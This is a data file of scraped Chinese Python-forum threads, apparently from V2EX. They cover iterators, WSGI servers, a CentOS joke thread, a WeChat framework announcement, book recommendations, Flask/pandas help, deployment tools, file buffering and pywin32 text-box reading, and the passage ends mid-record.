{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>看到网上的一段代码，不是很理解,&gt;_&lt;</p>\n<pre><code>\nclass MyRange(object):\n    def __init__(self, n):\n        self.idx = 0\n        self.n = n\n        \n    def __iter__(self):\n        return self\n        \n    def __next__(self):\n        if self.idx &lt; self.n:\n            val = self.idx\n            self.idx += 1\n            return val\n        else:\n            raise StopIteration()\n\t\t\t\n\nif __name__ == \"__main__\":\n    \n    myRange = MyRange(3)\n    \n    print([i for i in myRange])# 输出：[0, 1, 2]\n    # for in 执行流程如下\n    # iter(myRange)\n    # 执行了三次 next(myRange)\n    # 遇到 StopIteration 异常后，停止循环\n    \n    \n    print([i for i in myRange]) # 输出:[]\n    \n    # 为什么输出 [] 而不是 [0, 1, 2]\n    # 执行流程应该还是一样的\n    # iter(myRange)\n    # 执行了三次 next(myRange)\n    # 遇到 StopIteration 异常后，停止循环\n\n</code></pre>\n</div></div>"], "reply": "3", "tittle": "迭代器和可迭代对象的疑问", "comment": ["因为 myRange.idx 到 3 了呀。。。。", " 谢谢！", " 写着写着，人懵圈了。。。\r", "```python \r", "def __iter__(self):\r", "        return self\r", "```\r", "iter(myRange)返回的是自己 myRange 。。。"]},
{"content": ["<div class=\"topic_content\">大家用 gevent 的时候，为什么很少听说直接用 gevent 内置的 WSGI 服务器，都是用 gunicorn 或者 uWSGI ？区别大吗？还是仅仅是习惯而已？</div>"], "reply": "8", "tittle": "gevent.pywsgi vs gunicorn/uWSGI", "comment": ["gevent 也能开发 web 服务么？", "uwsgi 也可以跑 gevent,而且 uwsgi 有各种功能是内置 wsgi 服务器木有的,去看看 uwsgi 的选项有多少...", " 使用 gunicorn 的 gevent worker", " gevent 内置了一个  WSGI 的 server", " 嗯 内置的 server 功能比较基础。所以其实还是性能和个性化设置的需要。", "有用这个开发代理服务器的，我拿来改了改，单机用性能可以了，具体没测", " 一般 web 框架都自带了 wsgi server ，如果不想用 gunicorn ，那用 web 框架自带的 wsgi server 不是更方便？干嘛非用 gevent 的，他又不是主要做这个的。", " 其实我用 gevent 的 wsgi server 跑过一些服务,后来发现 uwsgi 能跑就都用 uwsgi 跑了"]},
{"content": ["<div class=\"topic_content\">A ： 你不是 Python 的死忠吗，为啥现在用 ROR 了？\r<br>B ：因为我更是 Centos6 的死忠</div>", "<div class=\"topic_content\">嗯嗯,  我为我的智商捉鸡, 但是更为其他人的情商捉鸡</div>"], "reply": "58", "tittle": "说个笑话，关于 python", "comment": ["一点都不好笑有木有", "笑到我肚子疼～", "centos 和 rails 有什么关系吗，没 get 到笑点", "因为 Centos6 是 python 2.7\r", "7 版本是 3?", " 谁告诉你 7 是 3", " 而且 CentOS 6 是 2.6 ， 2.7 都没有，妥妥的 Py 信仰破坏平台", "epel", "完全可以手动编译 python 版本解决，再不济用 docker 跑 python 容器", " 笑话而已， why so serious?", "用 pyenv 或 docker 直接隔离 python 版本~", " 因为不好笑，泼泼冷水，以刺激提高讲笑话的水平😒", "不好笑，差不多一多半的语言的运行环境都需要另装。\r", "\r", "CentOS 6.8 的 Ruby 版本也不过 1.87 ，怕是不合很多人的需要。", " 呵呵 你以为说笑话的人就不会 你说的这些吗？\r", "\r", "攻城狮真是无聊啊，说个笑话，就会理解为“你是笨蛋”", " ruby 版本可以随便升; python 版本随便升的话, yum 就彻底完蛋了", "就是不好笑嘛，生什么气。", "指定版本又不是重写系统内核，所以不好笑的段子干嘛要笑，更别说直接贴标签戴帽子了", "同意上面的意见，真的不好笑", "真的不好笑 +1", "不好笑+1", "python 分裂症“选择 2 还是 3 ？”", "自己说笑话水平低还怪别人笑不出来了", " \"选择 2\"之后, 还要选择\"选择<= 2.6\" 还是 \"选择 2.7\"", "其实真的不好笑. lz 别较真了....", "写了 5 年多 python 的表示现在在用 ROR", " 自带 2.7 ，可以 yum 安装 python3 ，是 3.4 。", "pyenv", "哪里好笑？", "不好笑。。", "ROR 是什么？", " 疑似 Ruby on Rails 不过我也没 Get 到笑点", "你装 RoR 不需要安装新版本 ruby ？\r", "\r", "python 就一定得用系统自带的就不能安装新版本的？", " 完全不懂，哎呦", "楼上因为不好笑发生了口角，这才是最好笑的 ", " ", "程序员好较真我发现。。。不好笑路过一句“呵呵”就行了嘛。。。非要这么认真纠正。。", "  所以找不到女朋友啊", " 卧轨自杀的宝石", " yum 就是 python 写的，你可以试试装上，然后使用。各种惊喜", " \r", "CentOS7 是 2.7.5", " shabang 改一下，手动升级 python ， yum 也正常用，没问题啊。", " 装了，然而并不影响", "pyenv 解决 根本不用动系统的 Python 版本", "好冷的笑话", " 表示装了之后 yum 正常啊", "装了 epel 里的 py3 。。", "这也是笑话么", "python 不是可以自已编译安装的吗？想装什么版本就装什么版本？想在一个系统上装多少个版本就装多少个版本，怎么会限制在系统上的版本啊？这笑话太冷了。\r", "\r", "(当然注意不能改系统的 python 版本，会导致系统不稳定）\r", "\r", "比如在 debian 上装 python 到 /opt/python3.4:\r", "\r", "# enable src repo from /etc/apt/sources.list\r", "\r", "sudo apt-get build-dep python3\r", "sudo apt-get install libncurses5-dev libncursesw5-dev libreadline6-dev\r", "sudo apt-get install libdb5.1-dev libgdbm-dev libsqlite3-dev libssl-dev\r", "sudo apt-get install libbz2-dev libexpat1-dev liblzma-dev zlib1g-dev\r", "\r", "ver=3.4.3\r", "wget ", "\r", "tar xJf Python-$ver.tar.xz\r", "cd Python-$ver\r", "./configure --prefix=/opt/python3.4\r", "make\r", "sudo make altinstall\r", "\r", "\r", "> /opt/python3.4/bin/python3.4 -V\r", "Python 3.4.3", "pyenv 。", "引爆一轮骂战才是最好笑的", "我来个更冷的，当年我写人生第一个 Hello World\r", "\r", "#!/usr/bin/env python\r", "# -*- coding: utf-8 -*-\r", "\r", "print 'Hello World!'\r", "\r", "上面这段代码当时我调试了 2 天....最后还是我表哥来我家玩给我解决的...", "centos 妥妥的 2.6 啊，我本地 ubuntu 用的 pykafka 在线上跑不了，关键大量部署都用 virtualenv 太扯了，最后换成了 Kafka-Pythn 。。。。", "表示在 CentOS 部署过 Python3 应用", "gentoo 内置多版本，大和谐。", "水平捉急的笑话啊，即使 ububtu 自带 2.7.6 我都不用，自己用 pyenv 装 2.7.12 再环境隔离", " 恩,你牛逼, 这个笑话还算好笑吧?", "  不好笑，讲这个笑话的人也并不熟悉 python", " cent os 6 ？ cent os 7 中 yum 已经重定向至 dnf 了", " centos7 epel 源里的 python34 ，装了后 python 默认为 python3 ，但不影响 yum", " cent os 7 已经没有 yum 了，被重定向至 dnf 了，所以你升级不会崩，你换 6 试一下妥妥的崩"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>itchatmp 是我近期的一个新的项目，尝试将协程和公众平台的配置尽量简化给开发者，希望你喜欢。</p>\n<p>本项目基于 tornado 框架，轻松满足效率需求。支持普通使用、 nginx 反向代理与 wsgi 。</p>\n<p>同样的命令，支持同步与协程调用（详见进阶使用一章），适合各层次开发者使用。</p>\n<p>与个人号接口<a href=\"https://github.com/littlecodersh/itchat\" rel=\"nofollow\">itchat</a>共享类似的操作方式，学习一次掌握两个工具。</p>\n<h2>安装</h2>\n<p>可以通过本命令安装 itchatmp ：</p>\n<pre><code>pip install itchatmp\n</code></pre>\n<h2>快速入门</h2>\n<p>有了 itchatmp ，如果你想要回复发给自己的文本消息，只需要这样：</p>\n<pre><code>import itchatmp\n\nitchatmp.update_config(itchatmp.WechatConfig(\n    token='yourToken',\n    appId = 'yourAppId',\n    appSecret = 'yourAppSecret'))\n\n@itchatmp.msg_register(itchatmp.content.TEXT)\ndef text_reply(msg):\n    return msg['content']\n\nitchatmp.run()\n</code></pre>\n<p>一些进阶应用可以在 Advanced uses 中看到，或者你也可以阅览<a href=\"http://itchatmp.readthedocs.io/zh_CN/latest/\" rel=\"nofollow\">文档</a>。</p>\n<h2>进阶使用</h2>\n<h3>企业号配置</h3>\n<p>在配置时设置 copId 而非 appId 即可。</p>\n<p>另，由于企业号没有明文模式，所以必须将加密模式设置为安全。</p>\n<p>具体的设置可以看<a href=\"http://itchatmp.readthedocs.io/zh_CN/latest/intro/enterprise/\" rel=\"nofollow\">这里</a>。</p>\n<h3>协程使用</h3>\n<p>如果你需要使用协程版本的 itchatmp ，你需要另外安装一个组件：</p>\n<pre><code>pip install itchatmphttp\n</code></pre>\n<p>这样，你的 itchatmp 就变成协程版本了。同样，删除以后就变回了线程池版本。</p>\n<p>例如回复信息的操作，协程也只需要这样写：</p>\n<pre><code>import itchatmp\nfrom tornado import gen\n\nitchatmp.update_config(itchatmp.WechatConfig(\n    token='yourToken',\n    appId = 'yourAppId',\n    appSecret = 'yourAppSecret'))\n\n@itchatmp.msg_register(itchatmp.content.TEXT)\ndef text_reply(msg):\n    yield gen.sleep(3)\n    r = yield itchatmp.send('First message', msg['FromUserName'])\n    print('First message sent: %s' % r)\n    yield gen.sleep(3)\n    r = yield itchatmp.send('First message', msg['FromUserName'])\n    print('Second message sent: %s' % r)\n\nitchatmp.run()\n</code></pre>\n<p>itchatmp 里面所有的方法都变成了协程方法，如果你不熟悉协程<strong>建议不要使用</strong>，线程池也足够满足普通需求。</p>\n<p>如果你问出类似为什么<code>time.sleep</code>阻塞了协程的问题，我会很困扰的。</p>\n<h3>WSGI 使用</h3>\n<p>如果你需要生成一个能够在类似 SAE 的平台上包装的应用，你可以这样生成：</p>\n<pre><code>app = itchatmp.run(isWsgi=True)\n</code></pre>\n<p>如果你还是无法配置，请阅读文档一栏的<a href=\"http://itchatmp.readthedocs.io/zh_CN/latest/other/deploy/\" rel=\"nofollow\">部署</a>部分。</p>\n<h2>意见与建议</h2>\n<p>如果有什么问题或者建议都可以在这个<a href=\"https://github.com/littlecodersh/itchatmp/issues/1\" rel=\"nofollow\">Issue</a>和我讨论</p>\n<p>当然也可以加入我们新建的 QQ 群讨论： 438747166</p>\n</div></div>"], "reply": "5", "tittle": "itchatmp：基于 tornado 的协程微信公众、企业号框架", "comment": ["代码放在了 github 上面： ", "楼主的另一个大作 itchat 现在可能是为数不多的在维护的 web 微信接口。\r", "基于我平时对楼主的了解，我相信 itchatmp 一定会是一个开放且易于使用的公众号接口。\r", "墙裂推荐。", "+1", "谢谢两位的支持！", "精品支持！ +1   强烈推荐  在使用 itchat 时候楼主给出了很多指导 非常感谢！"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>楼主看了小半个月的《 Python 基础编程》，看完了，收获肯定有的，但是还是感觉对 Python 的理解不是很深入，知识点也只是浅谈而已，现在准备买本能够深入的书籍，我发现一下三本：</p>\n<ol>\n<li>《 Python 核心编程》第三版</li>\n<li>《 Python 学习手册》第四版</li>\n<li>《 Python Cookbook 》第三版</li>\n</ol>\n<p>看过的童鞋推荐下吧，说说自身，有过系统的培训，面授那种，你懂的，全但不深入，现在有近两个月的时间去准备好好的读一本书+项目，中间获取也会在闲下来的时候看看《编写高质量 Python 代码的 59 个有效方法》，《 Python 基础编程》内容真心太简单了。</p>\n<p>求推荐求推荐。</p>\n</div></div>", "<div class=\"topic_content\">淫文看不懂，各位见谅，推荐一些新书籍也是 OK 的，</div>"], "reply": "35", "tittle": "《Python 核心编程》 OR 《Python 学习手册》 OR 《Python Cookbook》比较？", "comment": ["让我这种 python 标准库都没看完的情何以堪,其实看的最多的就是 python 官方文档", "我觉得标准库没必要通读一遍吧，尤其是对于有较多编程经验的。把目录看熟，然后用到什么再仔细查。", "cookbook 更像一本字典，总能找到你需要的", "《 Python 学习手册》 讲的比较细 适合打基础，之后看看《 Python Cookbook 》", "顺序 2 1 3", " Python 标准库太多了，根本看完不完，只有用到的时候在搜下看，所以主要是基础这方面。", " \r", " \r", "主要我感觉《 Python 学习手册》这本书有点老了， 11 年出的，内容也太久没更新了，而《 Python 核心编程》第三版则今年更新的，还有 PY3 的内容。", "那几本书都太过时了， 完全不建议看。\r", "\r", "个人推荐书单如下:\r", "\r", "1. 强烈推荐 Fluent Python ， 对 Python 的很多高阶概念解释得很清楚， 但目前只有英文版\r", "\r", "2. Effective Python\r", "Fluent Pythonhttps://book.douban.com/subject/26709315/\r", "\r", "3. Python in Practice\r", "\r", "\r", "后两本则偏重于一些技巧、设计模式。 有中文版，但不清楚翻译质量\r", "\r", "不过还是建议先写一些小项目，再读这几本书， 毕竟纸上学来终觉浅", "擦， 三本我全买了，《 Python 核心编程》第三版 不适合新手看，  Python 学习手册》第四版  写的太啰嗦，  Python Cookbook 》第三版 属于编程实战型的， 个人认为可以   Python 学习手册-第四版 >>   《 Python 核心编程》  >>>  cookbook,", "我还是推荐楼主啃官方的 tutorial\r", "觉得没有问题，就开始做项目。遇到不懂的，就查官方的 reference 。\r", "如此，举一反三。", " 我也感觉过时，但是英文的却是是看不懂， so...", " Python 核心编程（第 3 版）英文原版也是 5\\6 年前了， 内容严重过时", " 表示我不是新手， so ，想加强下，太基础的我也懒得看，", " 我还没看，也不知道内容如何，", "核心编程三版&cookbook 前者是 web 开发的基础知识 后者是很多程序实例, 熟悉以后再看", " 还有其他好的书籍推荐吗？", "对于想好好学习，有耐心的，我强烈推荐 python 学习手册。\r", "然后看 programming python (这是一本 python 能干啥的书，都有涉及，如果上一本是语法，这本就是我学会语法能干啥的探索)。\r", "\r", "如果你想探索 python 高级知识那就上 fluent  python. 我说的是 python 特性高级知识。\r", "\r", "\r", "然后你就畅游大海吧。", " \r", "\r", "准备拿着当饭吃了。", "卧室 核心编程 和廖学峰的教程搭配着看的", " programming python 中文翻译的怎么样？错误方面多不多？", "在我看过 python 的书里面，对我帮助最大的是 python cookbook", " fluent python 这本书其实有中文版，不过鲜为人知，是由台湾歐萊禮出版社发行的繁体中文，详见： ", "这三本都看过。\r", "\r", "第一本入门教材。第二本提高。第三本是字典。不需要通读。\r", "\r", "第一本比第二本简单一点点。但是第一本和第二本都挺厚。\r", "其实真正的项目， cookbook 用到的并不是特别多，至少不是特别重要。\r", "\r", "另外，这几本书看完，也并不能做项目。那只是语法，语法只是敲门砖而已。", " \r", "还请前辈指点迷津。", "最近正好打算好好把 Python 的 Standard Library 读一遍，并记录一些笔记，可以看看我写的笔记（目前还没推送到博客上，大概一到两天一个 lib 的样子）\r", "\r", "我感觉可以看看 UCB 的 cs61a", " 排版还行。", "cookbook 这本书的好处是，每次遇到有什么不清楚的，拿出来一查，它上面总有。这本好像还是开源的，中文版也是。不过从头到尾的通看没有什么意义，还容易打瞌睡。", "基础编程那本讲的太笼统我看了两天就放那里吃灰了，核心编程用来入门还是不错的，深入点就看学习手册知识点讲的挺全的非常的好， cookbook 也不错不过我也是把它字典用。", " 以及准备买学习手册了。", "我也想知道有什么好的新的 python 书籍推荐，马一下", " 期待更新", "跟 @", " 一样，强烈推荐 Fluent Python ，写得深入浅出，把很多核心概念讲清楚，又提供了相当多相关的文档资料供你扩展阅读。同时 Fluent Python 覆盖面比 Python Cookbook 广，我觉得可以看完后再快速过下 Cookbook 即可。对比 Python 核心编程的话， Fluent Python 更接近语言本质，核心编程那本更接近实战练习。\r", "\r", "如果想深入编程语言的本质，看 Fluent Python 不错；如果是想做个代码熟手，那还是多写点代码，多看标准库文档，反而没必要看书。", "推荐一下导师的新书 Head First Python(2nd)  大概圣诞之后上架", "  看英文版啊，中文版没看过"]},
{"content": ["<div class=\"topic_content\">我想实现如下过程，请前辈答疑解惑。\r<br>1.打开 url,\r<br>2.读 sql,\r<br>3.pandas 处理，\r<br>4.excel 显示，\r<br>后面 2 ， 3 ， 4 步都没有问题，关键是从 1 到（ 2 ， 3 ， 4 ），怎么做呢，完全没思路，请帮帮忙</div>", "<div class=\"topic_content\">就是比如打开 <a target=\"_blank\" href=\"http://www.baidu.xn--com,-ye6f95k93rdifrpe8romx9c21ufg2a\" rel=\"nofollow\">www.baidu.com,就会执行已经写好的</a> 2 ， 3 ， 4 的 python 脚本啊</div>", "<div class=\"topic_content\">我建了个 flask 视图函数，把脚本都放里面了，在自己电脑可以运行，用别人电脑访问就没反应了，这中间还要做什么</div>", "<div class=\"topic_content\">这个问题搜索后解决了。另外出来个问题，用户执行视图函数时，比如打开一个文本文件，结果在我的电脑打开了，我想要的是在用户的电脑打开，应该怎么做，如果你知道请告诉我下，搜索引擎效率低，呵呵</div>"], "reply": "27", "tittle": "如何实现打开 url,读 sql,pandas 处理， excel 显示", "comment": [" 你好，我遇到的困难是从 ", " 2 ， 3 ， 4 ）， 2 ， 3 ， 4 步都没有困难", "1. 你未能明确自己的需求。\r", "什么叫“打开 url ”？你是要连接远程数据库？还是把*.sql 下载到本地后加载？\r", "\r", "2. 如果是前者，你并没有好好看我发给你的连接：\r", "```\r", "from sqlalchemy import create_engine\r", "\r", "engine2 = create_engine('mysql://THE DATABASE I AM ACCESSING')\r", "connection2 = engine2.connect()\r", "```\r", "\r", "如果你需要进一步的信息，请自行查询相关 docs ： ", "\r", "\r", "如果你不知道怎么找到 docs ，请自行学习如何使用 Google 。", "楼主你到底想实现什么功能感觉都没说清楚，打开 URL 读取 SQL 是什么鬼啦", "是 request ？类似爬虫。", " 就是比如打开 ", " 2 ， 3 ， 4 的 python 脚本啊", " 就是比如打开 ", " 2 ， 3 ， 4 的 python 脚本啊", " 就是比如打开 ", " 2 ， 3 ， 4 的 python 脚本啊", "我懂楼主的意思了，比如访问 ", " , 然后执行 2, 3, 4 的脚本，你需要一个 Python 的 web 框架，访问那个路由时，调用视图函数去完成那些事情就行了。", " 嗯嗯嗯，理解万岁啊，我建了个 flask 视图函数，把脚本都放里面了，在自己电脑可以运行，用别人电脑访问就没反应了，这中间还要做什么", " 路飞，你知道问题在哪吗？", " 你是在本机运行的吧，是不是自己访问 127.0.0.1:端口号 可以，别人不可以？ 如果是局域网的话，你可以运行在 0.0.0.0 ：端口号，别人访问你的电脑 ip : 端口号。", "这描述真是。。。。是别人访问你的 server 还是访问他电脑上的 server ？\r", "如果是访问你电脑上的 server ，那就是防火墙的事", " 没反应是什么意思，网络通了没，网络通能访问到你的 flask 没（如果你执行 runserver 是可以直接在命令行看到访问进来的记录），跟 pczww  说的一样，你要设置 0.0.0.0 才行： app.run(host='0.0.0.0', port=5000, debug=True)", " 嗯，网络通，谢谢啊，我去试试", " 嗯，不过用的 tornado,怎么设置呢", " 我觉得你用搜索引擎能够找到答案了，是不是？", "楼主，去看看 flask 自带的 demo", "lz 需要看看提问的艺术和提高一下语文水平。", " 嗯这个问题搜索后解决了。另外出来个问题，用户执行视图函数，比如打开一个文本文件，结果在我的电脑打开了，我想要的是在用户的电脑打开，应该怎么做，如果你知道，搜索引擎效率低，呵呵", " 你说这样的话我真 TM 想喷你，别人的时间不是时间？", " 抱歉", " 怎么能这样一直问，你应该先有思路，再去搜索引擎，效率不低，不应该什么都问人不经思考\r", "思路：先先读取文件，把文件内容保存到一个变量， data=open('thefile.txt').read( )，把这个变量在视图里 return 回去，这么简单就完了\r", "这时候如果读取的文件是 EXCEL ，里面是表格的形式，该怎么读取，用什么变量保存，搜索引擎搜索几个 python excel 关键字即可；读出来的表格怎么展示到网页上，搜索 FLASK 展示表格，也会有答案的。\r", "\r", "综合你发帖的问题，几个关键的地方就按如下实现：\r", "1 、 flask 做网页展示，设计好视图、路由\r", "2 、在 flask 视图里实现， pandas 读取 CSV ： df=pd.read_csv()， pandas 的 dataframe 转换 HTML ： table=df.to_html()\r", "3 、 flask 视图传数据到模版（ HTML ）展示，视图里： return render_template('user.html', mytable=table)，模板里{{ mytable }}\r", "\r", "上面所写的代码，你都可以自行找资料找教程找搜索引擎来完成的，楼主应该多查找资料学习，这样得到的知识才是自己的", " 嗯，非常感谢你，按你的思路来学习", "楼主，我决定 block 你了。勿念。", "楼主需要学习一些业界通用名词来沟通😋", "计算机民科 ;)"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>Fabric 目前只支持 Py2 ，因为项目用的 Python3 ，不想在 2 和 3 间来回切换。是否有支持 Py3 的替代 Fabric 的库？</p>\n</div></div>"], "reply": "7", "tittle": "有没有类似于 Fabric 但支持 Py3 的自动部署工具？", "comment": ["Invoke ？", " 你有没有用过？刚简单读了下他的文档，好像主要用于执行本地的 shell 命令。能否执行远程服务器的命令？", "有几个 fork ，之前用过\r", " 好像没有什么问题，更新的 branch \r", " 没有用过。还有更新的 fork 也没有用过\r", "自动化部署脚本不应该是在本地跑吗，本地全局装 fabric,virtualenv 中装 python2", " 嗯，目前采用这个方案了，配合 autohotkey 在 windows 下还不错。", "  @", "     ", "\r", "这里不是已经绿了么, 还不支持 Python 3?", " 官方还没有支持 Python3 ： ", "\r", "那里的 py3k 版本也只是一个 fork ： "]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>需要统计服务器上的视频信息，写了个脚本，使用 MediaInfo 获取视频信息，但是因为文件数量比较多，便利效率比较低（单进程每秒 1.5 个文件），后来使用了 Multiprocessing 多进程，可以达到效率是高了，但是一个小时也才能获取到 1.5 万左右的文件信息。</p>\n<p>求问，有什么比较好的方法可以较高提高效率么？</p>\n<p>注：视频文件在文件服务器上，千兆网络挂载过来，使用了 Multiprocessing 后，遍历时速度带宽大约到了 800~900M，主要代码如下：</p>\n<pre><code>pool_size = multiprocessing.cpu_count() * 2 - 4\nwith multiprocessing.Pool(pool_size) as Pool:\n    walk = os.walk(path)\n    fn_gen = itertools.chain.from_iterable((os.path.join(root, file) for file in files) for root, dirs, files in walk)\n    Pool.map(video_handler, fn_gen)\n</code></pre>\n</div></div>"], "reply": "10", "tittle": "如何高效的遍历一个海量视频的文件夹获取所有视频 Metadata？", "comment": ["ffprobe", "用 pymediainfo 然后在本地执行\r", "（只是获取 mediainfo 并不需要完整读取文件\r", "（但是你通过网络挂载的话可能不支持 seek 导致需要读取完整文件\r", "（这或许是主要导致慢的原因", "这个 io 是瓶颈,试试多线程的线程池(可以试试开到 10 以上)+pymediainfo(mediainfo 的源代码里有 python 的用例)\r", "网络挂载是 smb/nfs/webdav/ftp?", " \r", " \r", "用的是 pymediainfo ，通过 cifs 挂载的。\r", "cpu 每个核的负载都是在 30~50%这样", "如果有机会的话可以换个协议么,比如 nfs\r", "\r", "说 cpu 负载是说本地还是服务器的呢\r", "cifs/smb 也有可能是服务器单核性能的瓶颈\r", "\r", "另外最好是用协程的 pool,会比线程进程池更高效.(除非视频处理跟复杂,那样的话还是用进程池)", " \r", "CPU 负载是说本地负载。\r", "我昨天试过用 Gevent.Pool ，效率不高，跟单进程的差不多，也有可能是我用的方式不对，我只是把上面 Multiprocessing 的 pool 换成了 gevent 的 pool 。", " 建议放置在 远程执行", "明天回去试试代码，感觉瓶颈在网络上", "这种东西本身就是需要一个高 IO 的问题，有条件换成 HDFS （能配 ssd 就更好了） MapReduce 会快很多，不可能换的话，几个方面考虑：\r", "1.使用 pypy\r", "2.不要把文件下回来然后处理，最好能在远程处理完\r", "3.视频读取媒体信息不需要完整读取的，所以直接解析文件头部就可以得到了，如果不想自己写解析函数，如果读取大文件的时候可以用 mmap 去读取而不是直接 fopen\r", "4.用 gevent ，记得先得使用 monkey patch 否则无效", " \r", "1. 使用扫描脚本是写在 Django admin 的 commands 里，方便操作数据库 ：）所以之前没考虑用 pypy\r", "2. 这个业务只是一个外部统计使用的，所以没有办法部署到相应的文件服务器上，只能通过网络挂载。\r", "3. 我现在使用的获取媒体信息的库是 MediaInfo （对应的 pymediainfo ），看介绍他应该就是只下载一部分内容即可的，稍后我测试一下看看。\r", "4. 这一点好像我忽略了，只是替换了它的 Pool ，稍后我尝试一下。\r", "\r", "感谢。"]},
{"content": ["<div class=\"topic_content\">比如两个用户同时访问一个 url ， django 后台会调用相应的视图函数处理。那么这个处理过程是先完成第一个用户的 request-response 周期后再执行第二个用户的请求呢？还是同时执行两个用户的 request 请求？</div>"], "reply": "4", "tittle": "django 的视图函数执行是同步的还是异步的？", "comment": ["没用过 django ，这个应该和你部署方式有关。", " 无论怎么部署，也只是把请求转发到后台来，最终还是 django 处理吧？您用的什么框架，这个框架是如何处理的呢？我知道 tornado 应该是异步的。", " 一个请求起一个线程", " 谢谢，我好想明白点了，请求会先经过服务器再由 django 处理，因此几个线程取决于服务器的设置。"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>buffering&gt;1</p>\n<pre><code>f = open('./test.txt', 'w', buffering=1024)\n\nf.write('+'*4)\n</code></pre>\n<p>打开 test.txt 发现已经有了++++，缓冲区不是设置成了 1024 么，怎么会这样</p>\n<p>buffering=1</p>\n<pre><code>f = open('./test.txt', 'w', buffering=1)\n\nf.write('+'*4)\n</code></pre>\n<p>打开 test.txt 没有++++，这种情况是符合帮助文章的描述的</p>\n<p>请问这是怎么回事呢？&gt;_&lt;</p>\n</div></div>", "<div class=\"topic_content\">尝试了两个平台\r<br>系统： windows\r<br>python 3.5.1\r<br>\r<br>系统： virtualbox ubuntu\r<br>python 3.5.1</div>"], "reply": "16", "tittle": "怎么设置 python 中 open 的 buffering 参数", "comment": ["以我粗浅的了解， 0 是关， 1 是开。", " 不是这样的。我按照 python 帮助文档定义进行操作，没有得到预期的结果", "f = open('./test.txt', 'w', buffering=1024)\r", "f.write('+'*4)\r", "import time\r", "time.sleep(10)\r", "\r", "这样呢，在十秒内看看里面有没有", "额，看错问题了", "如果你程序只有这几行，会在程序结束的时候自动 flush ，你如果要测试，在 write 后 sleep 很长时间，同时在程序未结束的时候查看文件", " 10 秒内看看里面没有，就算 10s 后里面也没有， f.flush()后才有，：)，谢谢！", " 嗯嗯，确实如此，谢谢啦。 sleep(10)， 10 秒内里面没有内容， 10s 后里面也没有， f.flush()才有++++\r", "为什么要自动 flush 呢？这个真心让人困惑", "你用控制台尝试下，程序退出会被强制 flush 的", " 如果在程序结束还不强制 flush ，那这个 buffering 本身设计就不合理了\r", "而且 open 的 buffering 是由系统实现的，系统在关闭所有输入输出流之前都会强制 flush\r", "至于问为什么，我只能说符合大部分人的理解观念\r", "要是不自动 flush 会带来无尽的坑", "给一个官方的解释：“ The optional buffering argument specifies the file ’ s desired buffer size: 0 means unbuffered, 1 means line buffered, any other positive value means use a buffer of (approximately) that size (in bytes). A negative buffering means to use the system default, which is usually line buffered for tty devices and fully buffered for other files. If omitted, the system default is used. ”\r", "1 代表启用， 0 代表关闭，为负的时候，由系统来管理，一般缓存 tty 设备上", " 谢啦，但是帮助文档的解释不能回答我的问题", " 确实如此，谢啦！\r", "\r", "运行环境： virtualbox ubuntu ipython3.5.1\r", "我在 ipython 控制台中，打开了两个终端，我尝试了一下如下代码\r", "\r", "终端 1 ： ipython （还未退出）\r", "``` python\r", "f = open('test.txt', 'w', buffering=4)\r", "\r", "f.write('+'*4)\r", "\r", "f.write('+')\r", "```\r", "终端 2\r", "tail -f test.txt\r", "\r", "但是 test.txt 没有出现+\r", "\r", "\r", "在终端 1 中输入 exit ，退出 ipython\r", "终端 2 出现了 5 个+\r", "\r", "\r", "通过你们的解释，这个我能理解了，程序中强制 flush\r", "\r", "但是程序没有退出，为什么没有进行 flush 呢？", " 谢谢！现在我在终端运行代码，终端退出和未退出的情形让我有点困惑。\r", "\r", "运行环境： virtualbox ubuntu ipython3.5.1\r", "我在 ipython 控制台中，打开了两个终端，我尝试了一下如下代码\r", "\r", "终端 1 ： ipython （还未退出）\r", "``` python\r", "f = open('test.txt', 'w', buffering=4)\r", "\r", "f.write('+'*4)\r", "\r", "f.write('+')\r", "```\r", "终端 2\r", "tail -f test.txt\r", "\r", "但是 test.txt 没有出现+\r", "\r", "\r", "在终端 1 中输入 exit ，退出 ipython\r", "终端 2 出现了 5 个+\r", "\r", "\r", "通过你们的解释，这个我能理解了，程序退出强制 flush\r", "\r", "但是程序没有退出，为什么没有进行 flush 呢？", " 很多系统在实现的时候缓冲区并不是只有一个，你这个最上层的缓冲区缓冲区满了填充了下层缓冲区而已。\r", "比如一般你 read()的缓冲区是 glibc 实现的，而系统的内核区还是有驱动级别的缓冲区，硬件本身也是有缓冲区的。而且并不能保证 python 给你返回的就是原生系统实现的 file 对象，可能是 cpython 包装了一层\r", "而 flush 会强制要求系统底层刷新（虽然系统到底是否执行是另一回事）", "这也就是为什么文件的读写经常需要加锁，因为在多进程同时读写同一个文件的时间很容易出现这种缓存不一致的情况", " 谢谢！答案太精彩了！越往下学，好像内容越来越多了，~_~"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>我已经用 spy++去确认我找到了文本框的句柄了。</p>\n<p>用函数 win32gui.SendMessage 获取不了文本框的文本内容，用 str 类型的参数接收获取的内容的话没有获取到东西，而用 PyBuffer 类型去获取则得到类似于 16 进制的东西。</p>\n<p>希望能找到解决方案。\n以下是代码：</p>\n<pre><code>from win32gui import *\nfrom win32api import *\nfrom win32process import *\nimport win32con\n\nimport time\n\ntime.sleep(3)\n\n# 获取窗体句柄\nhWnd = GetForegroundWindow()\nprint('hownd: ', hWnd)\n\nFormThreadID = GetCurrentThreadId()\nprint('FormThreadID: ', FormThreadID)\n\nCWndThreadID = GetWindowThreadProcessId(hWnd)\nprint('CWndThreadID: ', CWndThreadID)\n\nAttachThreadInput(CWndThreadID[0], FormThreadID, True)\n\n# 获取光标所在文本框句柄\nhWnd = GetFocus()\nprint('hWnd: ', hWnd)\n\nAttachThreadInput(CWndThreadID[0], FormThreadID, False)\n\n# SendMessage(hWnd, win32con.WM_SETTEXT, 0, \"mextb1860 第一个文本框\")\n\n# 文本框内容长度\nlength = SendMessage(hWnd, win32con.WM_GETTEXTLENGTH)+1\nprint('Length: ', length)\n\nbuf = '0'*length\n# 生成buffer对象\n# buf = PyMakeBuffer(length)\n\n# 获取文本框内容\nprint('get: ', SendMessage(hWnd, win32con.WM_GETTEXT, length, buf))\n\nprint('text: ', buf)\n</code></pre>\n</div></div>"], "reply": "8", "tittle": "pywin32 怎么获取 windows 的窗体内文本框的内容？", "comment": 